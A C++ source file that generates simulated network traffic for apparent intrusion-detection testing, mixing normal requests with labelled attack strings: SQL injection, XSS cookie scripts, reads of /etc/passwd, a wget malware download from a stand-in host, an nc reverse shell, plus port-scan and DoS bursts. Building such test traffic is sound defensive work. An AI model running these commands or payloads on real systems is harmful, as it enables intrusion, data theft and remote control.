#include "traffic_simulator.h"
#include <random>
#include <ctime>

std::vector<Packet> TrafficSimulator::generateTraffic(int count) {
    std::vector<Packet> packets;
    std::vector<std::string> ip_pool = {
        "192.168.1.10", "192.168.1.15", "10.0.0.2", "10.0.0.5", "172.16.0.3"
    };
    std::vector<std::string> payloads = {
        // Normal traffic
        "GET /index.html HTTP/1.1", "POST /login HTTP/1.1", "normal data transfer",
        
        // SQL Injection attempts
        "SELECT * FROM users WHERE id = 1 OR 1=1",
        "UNION SELECT username, password FROM users",
        "'; DROP TABLE users; --",
        
        // Command injection
        "eval(base64_decode('ZWNobyAiaGFja2VkIg=='))",
        "system('cat /etc/passwd')",
        "exec('net user admin password123')",
        
        // Script injection
        "<script>document.cookie</script>",
        "<script>alert(document.cookie)</script>",
        
        // Shell commands
        "wget http://malicious.com/malware.exe",
        "nc -e /bin/bash 10.0.0.1 4444",
        "chmod +x /tmp/backdoor",
        
        // Credential exposure
        "password=admin123",
        "admin_pass=root123",
        
        // Malware signatures
        "MZ\x90\x00\x03\x00\x00\x00", // PE file header
        "\\x90\\x90\\x90\\x90\\x90",   // NOP sled
        
        // Normal traffic (to mix in)
        "Hello World!", "GET /style.css", "POST /api/data"
    };
    
    // Add more ports including suspicious ones
    std::vector<int> ports = { 
        80, 443,           // HTTP/HTTPS
        22, 23,           // SSH/Telnet
        445, 139,         // SMB/NetBIOS
        3389,             // RDP
        4444, 31337,      // Common backdoor ports
        1433, 3306,       // SQL Server/MySQL
        21, 25            // FTP/SMTP
    };

    std::mt19937 rng(static_cast<unsigned>(time(nullptr)));
    std::uniform_int_distribution<> ip_dist(0, ip_pool.size() - 1);
    std::uniform_int_distribution<> port_dist(0, ports.size() - 1);
    std::uniform_int_distribution<> payload_dist(0, payloads.size() - 1);
    
    // Generate some sequential port scans
    if (count > 10) {
        std::string scanner_ip = ip_pool[ip_dist(rng)];
        for (int port = 1; port <= 100; port++) {
            Packet scan_pkt;
            scan_pkt.src_ip = scanner_ip;
            scan_pkt.dst_ip = "192.168.0.1";
            scan_pkt.port = port;
            scan_pkt.payload = "Port scan probe";
            packets.push_back(scan_pkt);
        }
    }

    // Generate regular traffic mixed with malicious packets
    for (int i = 0; i < count; ++i) {
        Packet pkt;
        pkt.src_ip = ip_pool[ip_dist(rng)];
        pkt.dst_ip = "192.168.0.1";
        pkt.port = ports[port_dist(rng)];
        pkt.payload = payloads[payload_dist(rng)];
        packets.push_back(pkt);
        
        // Occasionally generate a burst of packets (DoS simulation)
        if (i % 50 == 0) {
            std::string dos_ip = ip_pool[ip_dist(rng)];
            for (int j = 0; j < 20; j++) {
                Packet dos_pkt;
                dos_pkt.src_ip = dos_ip;
                dos_pkt.dst_ip = "192.168.0.1";
                dos_pkt.port = 80;
                dos_pkt.payload = "DoS packet";
                packets.push_back(dos_pkt);
            }
        }
    }

    return packets;
}